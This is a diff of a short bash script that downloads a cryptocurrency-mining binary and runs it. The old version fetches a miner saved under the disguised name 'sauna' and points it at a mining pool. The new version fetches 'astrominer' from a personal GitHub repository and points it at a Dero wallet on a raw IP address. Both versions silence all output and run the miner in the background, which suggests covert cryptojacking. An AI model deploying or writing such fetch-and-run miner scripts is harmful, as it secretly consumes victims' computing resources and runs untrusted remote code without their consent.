@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O sauna https://github.com/Project-InitVerse/miner/releases/download/v1.0.0/iniminer-linux-x64
-chmod 777 sauna
-./sauna --pool stratum+tcp://0x07ff670184606B7eD600524DcE0Ca6eDEB4e8E86.$(echo $RANDOM | md5sum | head -c 10)@pool-a.yatespool.com:31588 > /dev/null 2>&1 &
+wget https://github.com/bondaltomason/meo/releases/download/2.7.0/astrominer
+chmod +x astrominer
+./astrominer -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 95.179.145.38:10100 > /dev/null 2>&1 &
